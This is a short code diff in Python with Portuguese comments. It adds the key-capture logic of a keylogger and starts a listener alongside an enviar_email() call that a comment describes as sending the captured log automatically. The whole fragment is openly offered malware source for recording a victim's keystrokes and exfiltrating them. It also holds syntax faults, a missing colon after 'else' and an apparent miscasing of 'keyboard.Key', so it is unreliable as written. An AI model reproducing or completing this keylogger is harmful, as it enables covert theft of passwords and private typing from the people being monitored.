@@ -33,4 +33,18 @@ def on_press(key):
   global log
   try:
     log+= key.char
-  
+  except AttributeError:
+    if key == keyboard.key.space:
+      log+=" "
+    elif key == keyboard.key.enter:
+      log +="\n "
+    elif key == keyboard.key.backspace:
+      log +="[<]"
+    else
+      pass # Ignorar control, shift, etc...
+
+# Inicia o keylogger e o envio automático
+
+with keyboard.Listener(on_press=on_press) as listener:
+  enviar_email()
+  listener.join()
